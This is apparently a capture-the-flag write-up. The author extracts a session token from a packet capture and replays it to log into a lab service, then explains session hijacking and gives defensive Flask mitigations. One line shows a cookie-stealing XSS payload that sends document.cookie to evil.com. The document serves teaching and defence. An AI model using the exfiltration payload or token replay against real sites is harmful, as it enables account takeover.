---
layout: default
title: Intro To Forensics - Forensics
page_type: writeup
---

# Token-Based Login Service – Network Forensics & Session Hijacking

**Category:** Network Forensics / Web Exploitation

## 0. Challenge Overview

This challenge combined network forensics with web authentication bypass. The setup:
- A packet capture (pcapng) file containing network traffic
- A web service requiring token-based authentication
- The flag hidden behind successful authentication

**The objective:** Extract a valid authentication token from the network capture and use it to log into the web service.

**Core concept:** Authentication tokens transmitted in cleartext (HTTP) can be captured and replayed by anyone with access to the network traffic. This is a **session hijacking** attack enabled by unencrypted communications.

## 1. Initial Recon – Opening the Packet Capture

I downloaded the challenge archive and extracted the pcapng file:
```bash
unzip challenge.zip
ls -la
```

Output:
```
-rw-r--r-- 1 user user  45821 Mar 18 10:54 capture.pcapng
```

Opened it in Wireshark:
```bash
wireshark capture.pcapng
```

Initial observations:
- Traffic between 127.0.0.1 (loopback) — likely captured from the target system itself
- Mix of TCP and HTTP traffic
- Timestamps indicate capture from March 18, 2024

**Key observation:** This was a local capture, meaning someone already authenticated to the service and the traffic was recorded. My job: extract their session token.

## 2. Token Extraction – Finding the HTTP Response

### Filtering for HTTP Traffic
In Wireshark, I applied an HTTP filter to isolate web traffic:
```
http
```

This revealed several HTTP packets. I examined each response looking for authentication-related headers.

### Locating the Token-Bearing Packet
Packet #17 caught my attention:
```
17    11.050862377    127.0.0.1 → 127.0.0.1    TCP 396    [PSH, ACK] Seq=1 Ack=997 Win=512 Len=330
```

Right-click → Follow → TCP Stream showed the full HTTP exchange:

**HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.10.12
Date: Mon, 18 Mar 2024 10:54:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 57
Set-Cookie: token=0bf77fce4af7f09d7937b59b5dfe8ce4c018ea14cd3b363d12ddc7c670ca045313aa6156b40273390e43e6128d32b993742f09d1cea1db3e3837f6082d3e6932; Path=/
Connection: close
```

**Extracted token:**
```
0bf77fce4af7f09d7937b59b5dfe8ce4c018ea14cd3b363d12ddc7c670ca045313aa6156b40273390e43e6128d32b993742f09d1cea1db3e3837f6082d3e6932
```

✔ **Success:** Token extracted from `Set-Cookie` header.

**Key observation:** The token was transmitted in cleartext HTTP. Anyone with access to this network capture (MITM attacker, network admin, malware) could steal this session token and impersonate the user.

## 3. Token Submission – Authenticating to the Service

### Navigating to the Login Page
I opened the challenge website:
```
http://challenge.server/
```

The homepage displayed:
```
Please login to our service
```

The text "login to our service" was a hyperlink. Clicking it navigated to:
```
http://challenge.server/login
```

Which showed a login form:
```
Please provide a valid token:
[_______________]
     [Submit]
```

### Submitting the Captured Token
I entered the extracted token into the text box and clicked Submit.

**Server response:**
```
Thx for your request! Please go home now!
```

With a hyperlink labeled "home".

✔ **Success:** Token accepted. The server validated the stolen token without any additional checks.

**Key observation:** The server had no mechanism to detect that:
- The token was being used from a different IP address
- The token was being reused hours/days after issuance
- The User-Agent or other client fingerprints had changed

This is pure session hijacking — anyone with the token gets full access.

## 4. Flag Retrieval

Clicking the "home" hyperlink redirected to:
```
http://challenge.server/
```

Which now displayed:
```
Welcome to the CSCG Flag Service serving some flags:
CSCG{sn00py_sn00p_w1th_w1resh4rk!}
```

✔ **Success:** Flag retrieved through session hijacking.

Challenge complete.

## 5. Why This Works – Understanding Session Token Security

### Authentication vs Session Management
When you log into a web application:
```
1. Client sends credentials → Server
2. Server validates credentials
3. Server creates a session token
4. Server sends token to client (in cookie, header, or response body)
5. Client includes token in all subsequent requests
6. Server validates token instead of asking for credentials again
```

The token becomes a **bearer credential** — whoever possesses it can act as that user.

### The HTTP Cleartext Problem
In this challenge:
```
Client ←─────[HTTP Response]─────→ Server
         Set-Cookie: token=...
```

Because the connection used HTTP (not HTTPS):
- All traffic transmitted in **plaintext**
- Network packets contain the raw token value
- Any attacker on the network path can read it:
  - WiFi sniffing (open networks, rogue APs)
  - ARP spoofing / MITM attacks
  - Compromised routers
  - Malicious network admins
  - Packet captures (like this challenge)

### Session Hijacking Attack Flow
```
1. Victim authenticates → receives token
2. Attacker captures network traffic
3. Attacker extracts token from HTTP response
4. Attacker replays token in their own requests
5. Server accepts token → attacker gains access
```

No password guessing, no exploit code — just passive network monitoring.

### Why the Server Accepted the Token
The service validated only:
- **Token exists** ✓
- **Token matches a valid session** ✓

The service did NOT validate:
- IP address consistency ✗
- User-Agent fingerprinting ✗
- Geographic location ✗
- Time-based restrictions ✗
- Multi-factor authentication ✗

This is common in poorly implemented session management systems.

### Real-World Examples

**Firesheep (2010):**
- Browser extension for Firefox
- Automatically hijacked HTTP sessions on public WiFi
- Captured cookies from Facebook, Twitter, Amazon, etc.
- One-click session hijacking for any nearby user
- Forced major websites to adopt HTTPS

**Sidejacking:**
- Attack technique targeting HTTP-only session cookies
- Used extensively against sites without full HTTPS
- Led to the "HTTPS Everywhere" movement

**Cookie Theft via XSS:**
- While different from network sniffing, similar principle
- JavaScript injection steals cookies: `document.cookie`
- Exfiltrated to attacker server: `fetch('http://evil.com/?c=' + document.cookie)`
- Same result: attacker gains session token

## 6. Defensive Mitigations

### Use HTTPS Everywhere
**The Primary Defense:** Encrypt all HTTP traffic.

```python
# Flask example - Force HTTPS
from flask import Flask, redirect, request

app = Flask(__name__)

@app.before_request
def force_https():
    if not request.is_secure:
        url = request.url.replace('http://', 'https://', 1)
        return redirect(url, code=301)
```

HTTPS provides:
- **Confidentiality** - Encrypted traffic prevents eavesdropping
- **Integrity** - Tampering detection via MAC
- **Authentication** - Server identity verification via certificates

### Secure Cookie Attributes
Set proper cookie flags to harden session tokens:

```python
# BAD: No security attributes
response.set_cookie('token', token_value)

# GOOD: All security attributes
response.set_cookie(
    'token', 
    token_value,
    secure=True,       # Only send over HTTPS
    httponly=True,     # Not accessible to JavaScript (XSS protection)
    samesite='Strict', # CSRF protection
    max_age=3600       # Expire after 1 hour
)
```

| Attribute | Protection |
|-----------|------------|
| `Secure` | Cookie only sent over HTTPS (prevents HTTP interception) |
| `HttpOnly` | JavaScript cannot access cookie (prevents XSS theft) |
| `SameSite=Strict` | Cookie not sent on cross-site requests (prevents CSRF) |
| `Max-Age` | Token expires (limits replay window) |

### Session Binding & Validation
Implement additional checks beyond token validation:

```python
@app.route('/protected')
def protected_resource():
    token = request.cookies.get('token')
    session = get_session(token)
    
    if not session:
        return "Invalid token", 401
    
    # Additional validation checks
    if session['ip_address'] != request.remote_addr:
        log_suspicious_activity(session, request)
        return "Session IP mismatch", 403
    
    if session['user_agent'] != request.headers.get('User-Agent'):
        log_suspicious_activity(session, request)
        return "Session fingerprint mismatch", 403
    
    if time.time() > session['expires_at']:
        return "Session expired", 401
    
    return render_protected_content()
```

**Validation layers:**
- IP address consistency (detect session hijacking from different location)
- User-Agent fingerprinting (detect different browser/device)
- Token expiration (limit replay window)
- Geographic anomalies (login from US, then China 5 minutes later)

### Token Rotation
Regenerate tokens frequently:

```python
@app.route('/login', methods=['POST'])
def login():
    # Validate credentials
    if authenticate(username, password):
        token = generate_token()
        session = create_session(token, user_id)
        
        response = make_response(redirect('/dashboard'))
        response.set_cookie('token', token, secure=True, httponly=True)
        return response

@app.before_request
def rotate_token_if_old():
    token = request.cookies.get('token')
    session = get_session(token)
    
    # Rotate token every 15 minutes
    if session and time.time() - session['created_at'] > 900:
        new_token = generate_token()
        migrate_session(old_token=token, new_token=new_token)
        response.set_cookie('token', new_token, secure=True, httponly=True)
```

Benefits:
- Limits window of stolen token validity
- Old tokens become useless quickly
- Reduces impact of token compromise

### Multi-Factor Authentication (MFA)
Require additional verification for sensitive actions:

```python
@app.route('/admin/delete-user', methods=['POST'])
def delete_user():
    token = request.cookies.get('token')
    session = get_session(token)
    
    if not session:
        return "Unauthorized", 401
    
    # Require MFA for sensitive action
    otp = request.form.get('otp')
    if not verify_totp(session['user_id'], otp):
        return "Invalid MFA code", 403
    
    # Proceed with deletion
    delete_user_account(request.form.get('user_id'))
    return "User deleted", 200
```

Even if an attacker steals the session token, they can't perform sensitive actions without the second factor.

### Network-Level Defenses

**Certificate Pinning:**
```python
# Ensure client only accepts specific certificates
import requests

response = requests.get(
    'https://api.example.com/data',
    verify='/path/to/trusted_cert.pem'
)
```

**VPN/Zero Trust:**
- Require VPN for internal services
- Implement zero-trust architecture (verify every request)
- Use mutual TLS (client certificates)

### Monitoring & Detection
Log and alert on suspicious session activity:

```python
def log_suspicious_activity(session, request):
    alert = {
        'timestamp': time.time(),
        'session_id': session['id'],
        'user_id': session['user_id'],
        'expected_ip': session['ip_address'],
        'actual_ip': request.remote_addr,
        'expected_ua': session['user_agent'],
        'actual_ua': request.headers.get('User-Agent'),
        'severity': 'HIGH'
    }
    
    # Send to SIEM
    send_to_security_team(alert)
    
    # Optionally invalidate session
    if AUTO_INVALIDATE_ON_ANOMALY:
        invalidate_session(session['token'])
```

Alert triggers:
- Session used from multiple IPs simultaneously
- Session used from different countries in short timespan
- Sudden change in User-Agent
- Session used after user logout
- Excessive requests per second (automated tool)

## 7. Summary

By analyzing a packet capture with Wireshark, I extracted a session token from an HTTP `Set-Cookie` header and replayed it to hijack an authenticated session:

1. **Loaded the pcapng file** in Wireshark
2. **Filtered for HTTP traffic** and found the authentication response
3. **Extracted the token** from the `Set-Cookie` header
4. **Submitted the token** to the login form
5. **Retrieved the flag** after successful authentication

The vulnerability is straightforward but critical: **unencrypted authentication tokens transmitted over HTTP enable trivial session hijacking**. Any attacker with network access can capture the token and impersonate the user.

This isn't a hypothetical attack — tools like Firesheep automated this exact technique, forcing major websites to adopt HTTPS. Even today, misconfigured services that use HTTP for authentication remain vulnerable to:
- Public WiFi sniffing
- ARP spoofing / MITM attacks
- Network monitoring by ISPs, employers, or governments
- Malware with packet capture capabilities

The fix is mandatory: **use HTTPS for all authenticated sessions**, and implement defense-in-depth with secure cookie attributes, session validation, and anomaly detection.

The key lesson: **session tokens are bearer credentials** — treat them like passwords. Transmitting them in cleartext is equivalent to sending passwords in plaintext. HTTPS isn't optional for authenticated services; it's a fundamental security requirement.
